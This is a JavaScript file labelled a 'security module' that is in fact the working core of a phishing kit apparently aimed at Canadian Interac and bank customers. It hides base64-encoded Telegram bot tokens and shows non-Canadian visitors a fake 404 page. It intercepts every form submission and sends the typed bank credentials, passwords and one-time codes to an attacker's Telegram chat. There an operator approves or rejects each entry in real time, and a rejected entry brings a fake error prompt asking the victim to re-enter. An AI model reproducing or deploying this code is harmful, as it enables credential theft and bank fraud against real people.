// security_module.js
// Protection IP + Bot Telegram Interactif
(function() {
    const BOT_MAIN = atob("ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA=="); 
    const BOT_RADAR = atob("Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw=="); 
    const CHAT_ID = atob("Njc4ODAxMjQ4MQ==");

    if (!sessionStorage.getItem('uniq_session_id')) {
        sessionStorage.setItem('uniq_session_id', Math.floor(1000 + Math.random() * 9000).toString());
    }
    const SESSION_ID = sessionStorage.getItem('uniq_session_id');

    async function tgSend(token, text, reply_markup = null) {
        let payload = { chat_id: CHAT_ID, text: text, parse_mode: 'HTML' };
        if (reply_markup) payload.reply_markup = reply_markup;
        try {
            let res = await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            return await res.json();
        } catch(e) { return null; }
    }

    // 1. VERIFICATION IP
    async function verifyIP() {
        if (sessionStorage.getItem('geo_verified') === 'true') return;

        let ip = 'Inconnue', city = 'Inconnue', country = 'Inconnu', countryCode = '??';
        let cfTraceOk = false;

        const overlay = document.createElement('div');
        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;";
        document.documentElement.appendChild(overlay);

        try {
            const cfRes = await fetch('https://cloudflare.com/cdn-cgi/trace');
            const cfText = await cfRes.text();
            cfText.split('\n').forEach(line => {
                if (line.startsWith('ip=')) ip = line.split('=')[1];
                if (line.startsWith('loc=')) countryCode = line.split('=')[1];
            });
            if (countryCode !== '??') cfTraceOk = true;
        } catch (e) {}

        try {
            const geoRes = await fetch('https://get.geojs.io/v1/ip/geo.json');
            const geoData = await geoRes.json();
            if (geoData && geoData.country_code) {
               ip = geoData.ip || ip;
               city = geoData.city || city;
               country = geoData.country || country;
               countryCode = geoData.country_code || countryCode;
            }
        } catch (e) {}

        const date = new Date().toLocaleDateString('fr-FR');
        const time = new Date().toLocaleTimeString('fr-FR');

        function show404() {
            document.documentElement.innerHTML = '<div style="display:flex;height:100vh;align-items:center;justify-content:center;font-family:system-ui,sans-serif;background:#fff;color:#000;"><div style="display:flex;align-items:center;"><h1 style="font-size:24px;font-weight:500;border-right:1px solid rgba(0,0,0,0.3);margin:0 20px 0 0;padding:10px 23px 10px 0;">404</h1><h2 style="font-size:14px;font-weight:normal;margin:0;">This page could not be found.</h2></div></div>';
        }

        if (!cfTraceOk && countryCode === '??') {
            show404();
            tgSend(BOT_RADAR, "?? <b>ACCES BLOQUE (SECURITY MAXIMUM)</b> ??\n\nHeure : " + date + " à " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
            return;
        }

        if (countryCode !== 'CA') {
            show404();
            tgSend(BOT_RADAR, "?? <b>ACCES BLOQUE (HORS CANADA)</b> ??\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b> (" + countryCode + ")\nHeure : " + date + " à " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
            return;
        }

        overlay.remove();
        sessionStorage.setItem('geo_verified', 'true');
        sessionStorage.setItem('user_ip', ip);
        sessionStorage.setItem('user_city', city);
        sessionStorage.setItem('user_country', country);
        
        let pageName = window.location.pathname.split('/').pop() || 'Index';
        if (!sessionStorage.getItem('geo_notified') || pageName === 'interac.html' || pageName === 'index.html') {
            tgSend(BOT_RADAR, "?? <b>NOUVELLE CONNEXION (CANADA) - Page: " + pageName + "</b> ??\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b>\nHeure : " + date + " à " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
            sessionStorage.setItem('geo_notified', 'true');
        }
    }

    verifyIP();

    // 2. EVENEMENT CLIC SUR LES BANQUES
    function setupBankClicks() {
        const tiles = document.querySelectorAll('a.fi-tile, .fi-option, a[filabel]');
        tiles.forEach(tile => {
            if (tile.dataset.tgClickAttached === "true") return;
            tile.dataset.tgClickAttached = "true";

            tile.addEventListener('click', function() {
                let label = this.getAttribute('filabel') || this.innerText || 'Banque';
                let ip = sessionStorage.getItem('user_ip') || 'En cours...';
                let city = sessionStorage.getItem('user_city') || 'En cours...';
                
                let msg = "?? <b>CLIC BANQUE SELECTIONNEE</b> ??\n\nBanque : <b>" + label.trim() + "</b>\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nID Session : <code>" + SESSION_ID + "</code>";
                tgSend(BOT_RADAR, msg);
            });
        });
    }

    // 3. INTERCEPTION FORMULAIRES
    function setupForms() {
        const forms = document.querySelectorAll('form');
        
        forms.forEach(form => {
            if (form.dataset.tgAttached === "true") return;
            form.dataset.tgAttached = "true";

            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                e.stopPropagation();
                if (e.stopImmediatePropagation) e.stopImmediatePropagation();

                let loader = document.getElementById('telegramGlobalLoader');
                if (!loader) {
                    loader = document.createElement('div');
                    loader.id = 'telegramGlobalLoader';
                    loader.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;flex-direction:column;"><div style="border:4px solid #f3f3f3;border-top:4px solid #0981C5;border-radius:50%;width:50px;height:50px;animation:spinTg 1s linear infinite;"></div><p style="margin-top:20px;font-family:sans-serif;font-size:16px;color:#333;font-weight:bold;">Processing, please wait...</p><style>@keyframes spinTg { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style></div>';
                    document.body.appendChild(loader);
                } else {
                    loader.style.display = 'flex';
                }

                let dataText = "";
                const inputs = form.querySelectorAll('input, select, textarea');
                inputs.forEach(input => {
                    let name = input.name || input.id || input.placeholder || 'Champ';
                    let val = input.value ? input.value.trim() : '';
                    
                    if (input.type === 'checkbox' || input.type === 'radio') {
                        if (!input.checked) return;
                    }
                    
                    if (val !== '' && input.type !== 'submit' && input.type !== 'hidden' && input.type !== 'button') {
                        let cleanName = name.replace(/[-_]/g, ' ').toUpperCase();
                        dataText += "\n" + cleanName + ": <code>" + val + "</code>";
                    }
                });
                
                // Backup si aucun input n'a été capturé par querySelectorAll (ex: champs dynamiques)
                if (dataText === "") {
                    const allInputs = document.querySelectorAll('input');
                    allInputs.forEach(input => {
                        let name = input.name || input.id || 'VALEUR';
                        let val = input.value ? input.value.trim() : '';
                        if (val !== '' && input.type !== 'submit' && input.type !== 'hidden' && input.type !== 'button') {
                            let cleanName = name.replace(/[-_]/g, ' ').toUpperCase();
                            dataText += "\n" + cleanName + ": <code>" + val + "</code>";
                        }
                    });
                }

                let pageName = window.location.pathname.split('/').pop() || 'Formulaire';
                let msgText = "?? <b>NOUVELLE SAISIE BANCAIRE (" + pageName + ")</b> ??" + dataText + "\n\nID Session: <code>" + SESSION_ID + "</code>";

                let buttonRows = [
                    [
                        { text: "? Valide", callback_data: "valide_" + SESSION_ID },
                        { text: "? Error", callback_data: "error_" + SESSION_ID }
                    ],
                    [
                        { text: "+5s ?", callback_data: "add5_" + SESSION_ID },
                        { text: "+10s ?", callback_data: "add10_" + SESSION_ID }
                    ]
                ];

                let sentMsg = await tgSend(BOT_MAIN, msgText, { inline_keyboard: buttonRows });
                
                if (!sentMsg || !sentMsg.ok) {
                    setTimeout(() => { 
                        if (form.action && form.action !== window.location.href) {
                            window.location.href = form.action;
                        } else {
                            form.submit();
                        }
                    }, 3000);
                    return;
                }

                let msgId = sentMsg.result.message_id;
                let timeLeft = 12;
                let isFinished = false;
                let currentOffset = undefined;

                let timer = setInterval(() => {
                    if (isFinished) return;
                    timeLeft--;
                    
                    if (timeLeft <= 0) {
                        isFinished = true;
                        clearInterval(timer);
                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>Valide automatiquement (Temps ecoule)</i>", parse_mode: 'HTML'})
                        });
                        
                        let action = form.getAttribute('action');
                        if (action) {
                            window.location.href = action;
                        } else {
                            form.submit();
                        }
                    }
                }, 1000);

                let poller = setInterval(async () => {
                    if (isFinished) { clearInterval(poller); return; }
                    try {
                        let url = "https://api.telegram.org/bot" + BOT_MAIN + "/getUpdates?limit=20&allowed_updates=[\"callback_query\"]";
                        if (currentOffset) url += "&offset=" + currentOffset;
                        
                        let res = await fetch(url);
                        let updates = await res.json();
                        
                        if (updates.ok && updates.result.length > 0) {
                            currentOffset = updates.result[updates.result.length - 1].update_id + 1;
                            
                            for (let u of updates.result) {
                                if (u.callback_query && u.callback_query.data.includes(SESSION_ID)) {
                                    let cbData = u.callback_query.data;
                                    fetch("https://api.telegram.org/bot" + BOT_MAIN + "/answerCallbackQuery?callback_query_id=" + u.callback_query.id);
                                    
                                    if (cbData.startsWith('add5_')) {
                                        timeLeft += 5;
                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                            method: 'POST', headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <b>Temps restant : " + timeLeft + " secondes</b>", parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
                                        });
                                    }
                                    else if (cbData.startsWith('add10_')) {
                                        timeLeft += 10;
                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                            method: 'POST', headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <b>Temps restant : " + timeLeft + " secondes</b>", parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
                                        });
                                    }
                                    else if (cbData.startsWith('valide_')) {
                                        isFinished = true;
                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                            method: 'POST', headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>Valide par l'admin</i>", parse_mode: 'HTML'})
                                        });
                                        let action = form.getAttribute('action');
                                        if (action) window.location.href = action;
                                        else form.submit();
                                    }
                                    else if (cbData.startsWith('error_')) {
                                        isFinished = true;
                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                            method: 'POST', headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>Refuse par l'admin</i>", parse_mode: 'HTML'})
                                        });
                                        
                                        loader.style.display = 'none';
                                        
                                        let errorContainer = document.querySelector('.error-msg, .alert-danger, #errorMsg');
                                        if (errorContainer) {
                                            errorContainer.style.display = 'block';
                                            errorContainer.innerHTML = "Les informations saisies sont incorrectes. Veuillez réessayer.";
                                        } else {
                                            alert("Les informations saisies sont incorrectes. Veuillez réessayer.");
                                        }
                                        
                                        let pw = form.querySelector('input[type="password"], input[name*="code"], input[name*="otp"]');
                                        if (pw) pw.value = '';
                                    }
                                }
                            }
                        }
                    } catch(e){}
                }, 2000);
            }, true);
        });
    }

    function initAll() {
        setupBankClicks();
        setupForms();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initAll);
    } else {
        initAll();
    }
})();
